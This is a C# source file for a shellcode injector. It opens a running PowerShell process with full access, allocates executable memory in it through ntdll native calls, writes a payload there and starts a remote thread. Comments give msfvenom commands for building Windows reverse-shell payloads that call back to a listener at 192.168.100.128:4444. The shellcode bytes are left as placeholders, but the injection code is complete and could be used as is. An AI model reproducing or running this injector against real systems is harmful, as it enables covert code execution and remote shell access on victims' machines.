using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;


namespace Inject
{
    class Program
    {
        // https://www.pinvoke.net/default.aspx/kernel32/MapViewOfFile.html?diff=y
        private static readonly uint SECTION_MAP_READ = 0x0004;
        private static readonly uint SECTION_MAP_WRITE = 0x0002;
        private static readonly uint SECTION_MAP_EXECUTE = 0x0008;
        // https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint SEC_COMMIT = 0x8000000;
        private static readonly uint PAGE_READWRITE = 0x04;
        private static readonly uint PAGE_READEXECUTE = 0x20;
        private static readonly uint PAGE_NOACCESS = 0x01;
        private static readonly uint MEM_RELEASE = 0x00008000;
        private static readonly uint MEM_DECOMMIT = 0x00004000;
        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint MEM_RESERVE = 0x2000;
        private static readonly uint DELETE = 0x00010000;

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID clientId);

        [DllImport("ntdll.dll")]
        static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
        
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
        


        static void Main(string[] args)
        {
            byte[] buf;

            Process[] targetProcess = Process.GetProcessesByName("powershell");
            IntPtr htargetProcess = targetProcess[0].Handle;

            bool processArch = false;

            //Open remote process
            IntPtr hProcess = IntPtr.Zero;
            CLIENT_ID clientid = new CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(targetProcess[0].Id);
            clientid.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();

            // PROCESS_ALL_ACCESS = 0x001F0FFF
            uint status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref ObjectAttributes, ref clientid);
            Console.WriteLine($"[+] Process Handle is: {hProcess} / ProcessID: {clientid.UniqueProcess}");
            
            IsWow64Process(hProcess, out processArch);

            // x86 Payload: msfvenom -p windows/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            byte[] bufx86 = new byte[<Length>] { <SHELLCODE_x86> };

            // x64 Payload: msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            byte[] bufx64 = new byte[<Length>] { <SHELLCODE_x64> };

            if (processArch == true)
            {
                //Injected process is x86
                buf = bufx86;
                Console.WriteLine("[+] Shellcode injected to x86 process.");
            }
            else
            {
                //Injected process is x64
                buf = bufx64;
                Console.WriteLine("[+] Shellcode injected to x64 process.");

            }

            IntPtr baseAddress = new IntPtr();
            IntPtr regionSize = (IntPtr)buf.Length;

            // Memory Allocation
            IntPtr NtAllocResult = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Convert Demical to Hex
            var localBaseAddrString = string.Format("{0:X}", baseAddress); //Pointer -> String (DEC) format.
            UInt64 localBaseAddrInt = UInt64.Parse(localBaseAddrString); //String -> Integer
            string localBaseAddHex = localBaseAddrInt.ToString("x"); //Integer -> Hex
            Console.WriteLine($"[+] Result of 'NtAllocateVirtualMemory' is {NtAllocResult}");
            Console.WriteLine($"[+] Address of memory allocation is 0x{localBaseAddHex}");

            Console.WriteLine("1st breakpoint. Press Enter to continue ...");
            Console.ReadLine();

            int NtWriteProcess = NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out uint wr);

            Console.WriteLine("[+] Buffer has been written to the targeted process!");
            Console.WriteLine("2th breakpoint. Press Enter to continue ...");
            Console.ReadLine();


            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    // https://stackoverflow.com/questions/2057469/how-can-i-display-a-pointer-address-in-c
                    //string bufAddress = string.Format("0x{0:X}", new IntPtr(p2));

                    //Convert DEC->HEX
                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
                    string bufHex = bufInt.ToString("x"); //Integer -> Hex

                    Console.WriteLine("[+] Payload Address: " + "0x" + bufHex);

                }
            }


            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, htargetProcess,(IntPtr)baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);


            if (hThread == 0x00)
            {
                Console.WriteLine("[+] Injection Succeded!");
            }
            else
            {
                Console.WriteLine("[-] Injection failed!");
            }

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                    Console.WriteLine("\n");
                }

            }
           
        }
    }
}